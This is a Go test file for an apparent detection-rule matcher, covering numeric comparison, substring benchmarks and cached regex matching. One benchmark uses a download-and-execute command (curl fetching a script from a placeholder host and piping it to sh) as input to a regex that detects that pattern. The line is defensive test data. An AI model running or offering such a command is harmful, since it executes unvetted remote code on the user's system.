package modifiers

import (
	"fmt"
	"math/rand"
	"testing"
)

func Test_compareNumeric(t *testing.T) {
	tests := []struct {
		left       interface{}
		right      interface{}
		wantGt     bool
		wantGte    bool
		wantLt     bool
		wantLte    bool
		shouldFail bool
	}{
		{1, 2, false, false, true, true, false},
		{1.1, 1.2, false, false, true, true, false},
		{1, 1.2, false, false, true, true, false},
		{1.1, 2, false, false, true, true, false},
		{1, "2", false, false, true, true, false},
		{"1.1", 1.2, false, false, true, true, false},
		{"1.1", 1.1, false, true, false, true, false},

		// The function panics if it's interfaces are nil, this happens if it doesn't find the field in the event and it's compared to a int or float
		{nil, 2, true, false, false, false, true},
		{nil, nil, true, false, false, false, true},
		{2, nil, true, false, false, false, true},
		// If we pass anything (like an ip address) other than an int or float, the functions recurses until it stack overflows
		{"127.0.0.1", "127.0.0.1", true, false, false, false, true},
		{"127.0.0.1", 0.2, true, false, false, false, true},
	}
	for _, tt := range tests {
		t.Run(fmt.Sprintf("%s_%s", tt.left, tt.right), func(t *testing.T) {
			gotGt, gotGte, gotLt, gotLte, err := compareNumeric(tt.left, tt.right)
			if err != nil {
				if !tt.shouldFail {
					t.Errorf("compareNumeric() error = %v", err)
					return
				} else {
					return
				}
			}
			if gotGt != tt.wantGt {
				t.Errorf("compareNumeric() gotGt = %v, want %v", gotGt, tt.wantGt)
			}
			if gotGte != tt.wantGte {
				t.Errorf("compareNumeric() gotGte = %v, want %v", gotGte, tt.wantGte)
			}
			if gotLt != tt.wantLt {
				t.Errorf("compareNumeric() gotLt = %v, want %v", gotLt, tt.wantLt)
			}
			if gotLte != tt.wantLte {
				t.Errorf("compareNumeric() gotLte = %v, want %v", gotLte, tt.wantLte)
			}
		})
	}
}

func BenchmarkContains(b *testing.B) {
	needle := "abcdefg"

	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	haystack := make([]rune, 1_000_000)
	for i := range haystack {
		haystack[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	haystackString := string(haystack)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, err := contains{}.Matches(string(haystackString), needle)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkContainsCS(b *testing.B) {
	needle := "abcdefg"

	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	haystack := make([]rune, 1_000_000)
	for i := range haystack {
		haystack[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	haystackString := string(haystack)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, err := containsCS{}.Matches(string(haystackString), needle)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkRe(b *testing.B) {
	comparator, err := GetComparator("field", Comparators, "re")
	if err != nil {
		b.Fatal(err)
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, err := comparator(`/usr/bin/curl -s http://example.com/install.sh | sh`, `(?i)(curl|wget)\s+.*\|\s*(ba)?sh`)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func Test_re(t *testing.T) {
	tests := []struct {
		actual   string
		expected string
		want     bool
		wantErr  bool
	}{
		{"foo-bar-baz", "foo.*baz", true, false},
		{"foo-bar-baz", "^bar", false, false},
		{"FOO", "(?i)foo", true, false},
		{"foo", "foo(", false, true},
	}
	for _, tt := range tests {
		t.Run(tt.expected, func(t *testing.T) {
			// run twice so that the second call uses the cached regex
			for i := 0; i < 2; i++ {
				got, err := re{}.Matches(tt.actual, tt.expected)
				if (err != nil) != tt.wantErr {
					t.Fatalf("re.Matches() error = %v, wantErr %v", err, tt.wantErr)
				}
				if got != tt.want {
					t.Errorf("re.Matches() = %v, want %v", got, tt.want)
				}
			}
		})
	}

	first, err := compileRegex("cached")
	if err != nil {
		t.Fatal(err)
	}
	second, _ := compileRegex("cached")
	if first != second {
		t.Error("expected compileRegex to return the cached *regexp.Regexp")
	}
}
